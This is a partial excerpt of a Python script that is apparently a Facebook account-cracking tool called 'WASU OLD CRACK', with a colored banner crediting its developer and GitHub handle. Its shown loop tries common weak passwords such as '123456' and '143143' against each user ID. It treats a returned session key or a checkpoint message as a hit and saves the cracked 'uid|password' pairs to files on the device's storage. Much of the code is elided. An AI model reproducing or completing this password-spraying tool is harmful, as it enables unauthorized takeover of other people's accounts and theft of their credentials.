#Sc gift by SM9RTY W9SU KING
#Github: https://github.com/BHATWASUXWD420
#Tool Type : WASU OLD CRACK 
#----------------------------[IMPORT/MODULE]-----------------------------------#
...
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  BH9T W9SU XWD
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m BROTHERS    :  W9SU X R9IF
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  BHATWASUXWD420
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/WASU-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mwasu-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/WASU-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
